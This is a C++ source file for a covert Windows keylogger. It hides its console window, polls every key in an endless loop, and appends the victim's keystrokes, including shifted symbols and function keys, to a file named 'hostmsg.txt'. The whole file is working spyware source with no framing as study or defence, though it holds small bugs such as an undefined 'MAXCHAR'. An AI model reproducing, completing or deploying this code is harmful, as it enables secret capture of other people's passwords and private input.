#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

#define MAX_CHAR 255

using namespace std;

void hide();
void log();
string getCurrentDirectoryOnWindows();

int main()
{
    hide();
    log();
    return 0;
}

void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void log()
{
     const string FILE_NAME = "hostmsg.txt";
     string fileName = getCurrentDirectoryOnWindows()+"\\"+FILE_NAME;
    char key;
    //sleep(0);
    for(;;)
    {

        for( key=8; key<MAX_CHAR; key++ )
        {
            Sleep(0);
            if(GetAsyncKeyState(key) == -32767)
            {
                ofstream write (fileName.c_str(), ios::app);
                //write << "        " << (int)(key) << "      " << endl;
                if((key>64) && (key<91) && !(GetAsyncKeyState(0x10)))
                {
                    key+=32;
                    write << (char)(key%MAXCHAR);
                    write.close();
                    break;
                }
                else if((key>64) && (key<91))
                {
                    write << (char)(key%MAX_CHAR);
                    write.close();
                    break;
                }
                else
                {
                    switch(key)
                    {

                        case 48:
                        {
                            if( GetAsyncKeyState(0x10) )
                                write << ")";
                            else
                                write << "0";
                        }
                        break;
                        case 49:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "!";
                            else
                                write << "1";
                        }
                        break;
                        case 50:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "\"";
                            else
                                write << "2";
                        }
                        break;
                        case 51:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "#";
                            else
                                write << "3";
                        }
                        break;
                        case 52:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "$";
                            else
                                write << "4";
                        }
                        break;
                        case 53:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "%";
                            else
                                write << "5";
                        }
                        break;
                        case 54:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "^";
                            else
                                write << "6";
                        }
                        break;
                        case 55:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "&";
                            else
                                write << "7";
                        }
                        break;
                        case 56:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "*";
                            else
                                write << "8";
                        }
                        break;
                        case 57:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "(";
                            else
                                write << "9";
                        }
                        break;
                        case VK_SPACE:
                            write << " ";
                        break;
                        case VK_RETURN:
                            write << "\n";//<ENTER>
                        break;
                       /* case VK_TAB:
                            write << "<TAB>";
                        break;
                        case VK_BACK:
                            write << "<BS>";
                        break;
                        case VK_ESCAPE:
                            write << "<ESC>";
                        break;
                        case VK_DELETE:
                            write << "<Del>";
                        break;
                        case VK_SHIFT:
                            write << "<Sft>";
                        break;
                        case VK_CONTROL:
                            write << "<Ctrl>";
                        break;
                        case VK_MENU:
                            write << "<Alt>";
                        break;*/
                        case VK_CAPITAL:
                            write << "<CapsLock>";
                        break;
                        /* case VK_PRIOR:
                            write << "<PageUp>";
                        break;
                        case VK_NEXT:
                            write << "<PageDown>";
                        break;
                        case VK_UP:
                            write << "<UP>";
                        break;
                        case VK_DOWN:
                            write << "<DOWN>";
                        break;
                         case VK_LEFT:
                            write << "<LEFT>";
                        break;
                        case VK_RIGHT:
                            write << "<RIGHT>";
                        break;*/
                        case VK_NUMPAD0:
                            write << "0";
                        break;
                        case VK_NUMPAD1:
                            write << "1";
                        break;
                        case VK_NUMPAD2:
                            write << "2";
                        break;
                        case VK_NUMPAD3:
                            write << "3";
                        break;
                        case VK_NUMPAD4:
                            write << "4";
                        break;
                        case VK_NUMPAD5:
                            write << "5";
                        break;
                        case VK_NUMPAD6:
                            write << "6";
                        break;
                        case VK_NUMPAD7:
                            write << "7";
                        break;
                        case VK_NUMPAD8:
                            write << "8";
                        break;
                        case VK_NUMPAD9:
                            write << "9";
                        break;
                        case VK_MULTIPLY:
                            write << "<NUM *>";
                        break;
                        case VK_ADD:
                            write << "<NUM +>";
                        break;
                        case VK_SEPARATOR:
                            write << "<NUM Seprtr .>";
                        break;
                        case VK_SUBTRACT:
                            write << "<NUM ->";
                        break;
                        case VK_DECIMAL:
                            write << "<NUM .>";
                        break;
                        case VK_DIVIDE:
                            write << "<NUM />";
                        break;
                        case VK_F1:
                            write << "<F1>";
                        break;
                        case VK_F2:
                            write << "<F2>";
                        break;
                        case VK_F3:
                            write << "<F3>";
                        break;
                        case VK_F4:
                            write << "<F4>";
                        break;
                        case VK_F5:
                            write << "<F5>";
                        break;
                         case VK_F6:
                            write << "<F6>";
                        break;
                        case VK_F7:
                            write << "<F7>";
                        break;
                        case VK_F8:
                            write << "<F8>";
                        break;
                        case VK_F9:
                            write << "<F9>";
                        break;
                        case VK_F10:
                            write << "<F10>";
                        break;
                        case VK_F11:
                            write << "<F11>";
                        break;
                        case VK_F12:
                            write << "<F12>";
                        break;
                        /*case VK_NUMLOCK:
                            write << "<NUMLOCK>";
                        break;
                        case VK_SCROLL:
                            write << "<SCROLLLOCK>";
                        break;
                        case VK_LSHIFT:
                            write << "<LSft>";
                        break;
                        case VK_RSHIFT:
                            write << "<RSft>";
                        break;
                        case VK_LCONTROL:
                            write << "<LCtrl>";
                        break;
                        case VK_RCONTROL:
                            write << "<RCtrl>";
                        break;
                        case VK_LBUTTON:
                            write << "<LMouse>";
                        break;
                        case VK_RBUTTON:
                            write << "<RMouse>";
                        break;
                        case VK_CANCEL:
                            write << "<Pause/Break>";
                        break;
                        case VK_MBUTTON:
                            write << "<MMouse>";
                        break;
                       case 96:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "~";
                            else
                                write << "`";
                        }
                        break;

                        break;
                        case 61:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "+";
                            else
                                write << "=";
                        }
                        break;
                        case 91:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "{";
                            else
                                write << "[";
                        }
                        break;
                        case 93:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "}";
                            else
                                write << "]";
                        }
                        break;
                        case 59:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << ":";
                            else
                                write << ";";
                        }
                        break;
                        case 39:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "\"";
                            else
                                write << "'";
                        }
                        break;
                        case 92:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "|";
                            else
                                write << "\\";
                        }
                        break;
                        case 44:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "<";
                            else
                                write << ",";
                        }
                        break;
                        case 46:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << ">";
                            else
                                write << ".";
                        }
                        break;
                        case 47 || VK_OEM_2:
                        {
                            if(GetAsyncKeyState(0x10))
                                write << "?";
                            else
                                write << "\\";
                        }
                        break;
                        case VK_HOME:
                            write << "<HOME>";
                        break;
                        case VK_END:
                            write << "<END>";
                        break;
                        case VK_INSERT:
                            write << "<INS>";
                        break;
                        case VK_PRINT:
                            write << "<PRINT>";
                        break;*/

                        default: write << key;
                    }
                }
            }
        }
    }
}
string getCurrentDirectoryOnWindows()
{
    const unsigned long maxDir = 260;
    char currentDir[maxDir];
    GetCurrentDirectory(maxDir, currentDir);
    return string(currentDir);
}

